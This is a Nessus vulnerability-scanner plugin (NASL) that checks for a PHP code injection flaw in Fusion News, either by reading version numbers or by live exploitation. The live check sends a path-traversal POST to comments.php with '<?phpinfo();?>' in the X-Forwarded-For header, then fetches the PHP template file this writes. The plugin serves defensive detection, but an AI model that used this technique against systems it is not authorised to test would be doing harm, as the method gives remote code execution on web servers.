#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description) {
  script_id(18302);
  script_version("$Revision: 1.12 $");
  script_bugtraq_id(13661);
  script_osvdb_id(51194);

  script_name(english:"Fusion News comments.php X-Forwarded-For HTTP Header Arbitrary Code Injection");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is susceptible
to an arbitrary code injection attack." );
 script_set_attribute(attribute:"description", value:
"The version of Fusion News installed on the remote host suffers from a
flaw that allows a remote attacker to execute arbitrary PHP code
subject to the privileges of the web server userid." );
 script_set_attribute(attribute:"see_also", value:"http://downloads.securityfocus.com/vulnerabilities/exploits/fusion.php" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");


 script_set_attribute(attribute:"plugin_publication_date", value: "2005/05/19");
 script_cvs_date("$Date: 2011/11/29 19:25:43 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

  script_summary(english:"Checks for X-Forwarded-For code injection vulnerability in Fusion News");
  script_category(ACT_MIXED_ATTACK);
  script_family(english:"CGI abuses");
  script_copyright(english:"This script is Copyright (C) 2005-2011 Tenable Network Security, Inc.");
  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# For each CGI directory...
foreach dir (cgi_dirs()) {
  # Grab the affected script.
  r = http_send_recv3(method:"GET",item:string(dir, "/comments.php"), port:port);
  if (isnull(r)) exit(0);
  res = r[2];

  # If it looks like Fusion News...
  pat = "<title>f u s i o n : n e w s";
  if (egrep(string:res, pattern:pat, icase:TRUE)) {
    # If safe checks are enabled...
    if (safe_checks()) {
      # Try to get the version number from fusionnews.xml.
      r = http_send_recv3(method:"GET",item:string(dir, "/fusionnews.xml"), port:port);
      if (isnull(r)) exit(0);
      res = r[2];

      pat = "<generator>Fusion News ([^<]+)</generator>";
      matches = egrep(pattern:pat, string:res, icase:TRUE);
      foreach match (split(matches)) {
        match = chomp(match);
        ver = eregmatch(pattern:pat, string:match);
        if (!isnull(ver)) {
          ver = ver[1];
          break;
        }
      }

      # If that failed, try to get it from language.db.
      if (isnull(ver)) {
        r = http_send_recv3(method:"GET", item:string(dir, "/language.db"), port:port);
        if (isnull(r)) exit(0);
	res = r[2];

        pat = "^fusion news (.+)$";
        matches = egrep(pattern:pat, string:res, icase:TRUE);
        foreach match (split(matches)) {
          match = chomp(match);
          ver = eregmatch(pattern:pat, string:match);
          if (!isnull(ver)) {
            ver = ver[1];
            break;
          }
        }
      }

      # Check the version number if we have it.
      if (
        ver &&
        # nb: 3.6.1 and lower are affected.
        ver =~ "^([0-2]\.|3\.([0-5]\.|6($|\.1[^0-9]?)))"
      ) {
        report = string(
          "Nessus has determined the vulnerability exists on the remote\n",
          "host simply by looking at the version number of Fusion News\n",
          "installed there.\n"
        );
        security_hole(port:port, extra: report);
        exit(0);
      }
    }
    # Otherwise...
    else {
      # Try to exploit the flaw.
      fname = string(rand_str(), "-", SCRIPT_NAME);
      postdata = string(
        "name=test&",
        "email=&",
        "fullnews=test&",
        "chars=297&",
        "com_Submit=Submit&",
        "pass="
      );
      rq = http_mk_post_req(item: strcat(dir, "/comments.php?mid=post&id=/../../templates/", fname),
      	version: 11, data: postdata,
        port:port,
	add_headers: make_array("Cache-Control", "no-cache",
		     "X-FORWARDED-FOR", "<?phpinfo();?>",
		     "Content-Type", "application/x-www-form-urlencoded"));
      r = http_send_recv_req(port: port, req: rq);
      if (isnull(r)) exit(0);

      # Wait for a bit to get around the flood protection 
      # (default is 30 seconds).
      sleep(31);

      # NB: if the file specified by 'fname' doesn't yet exist (it shouldn't),
      #     it's necessary to do this a second time for writes to appear.
      r = http_send_recv_req(port: port, req: rq);
      if (isnull(r)) exit(0);

      # Now try to retrieve the template.
      r = http_send_recv3(method:"GET", item:string(dir, "/templates/", fname, ".php"), port:port);
      if (isnull(r)) exit(0);
      res = r[2];

      # There's a problem if it looks like the output of phpinfo().
      if ("PHP Version" >< res) {
        report = string(
          "Nessus has successfully exploited this vulnerability by uploading\n",
          "a 'template' with PHP code that reveals information about the PHP\n",
          "configuration on the remote host. The file is located under the\n",
          "web server's document directory as:\n",
          "         ", dir, "templates/", fname, ".php\n",
          "You are strongly encouraged to delete this file as soon as\n",
          "possible as it can be run by anyone who accesses it.\n"
        );
        security_hole(port:port, extra: report);
        exit(0);
      }
    }
  }
}
